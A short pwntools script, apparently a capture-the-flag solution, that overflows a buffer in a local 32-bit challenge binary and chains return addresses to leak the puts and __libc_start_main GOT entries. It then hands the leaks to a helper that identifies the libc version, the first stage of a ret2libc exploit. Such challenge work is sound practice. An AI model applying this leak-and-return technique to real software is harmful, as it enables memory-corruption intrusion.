from pwn import *

import TheNight

import sys

target = process("./chall-test_localLibcId-2-x86")
payload = ""
payload += "00000000000000000000000000000000000000000000000000"
payload += p32(0xdeadbeef)
payload += "000000000000"
payload += p32(0x8049090)
payload += p32(0x8049090)
payload += p32(0x804c010)
payload += p32(0x804c018)
target.sendline(payload)
target.recvline()
leak = target.recv(4)
gotAddress0 = u32(leak)
target.recvline()
leak = target.recv(4)
gotAddress1 = u32(leak)
symbol0 = "puts"
symbol1 = "__libc_start_main"
TheNight.findLibcVersionAutomated("puts", gotAddress0, "__libc_start_main", gotAddress1)
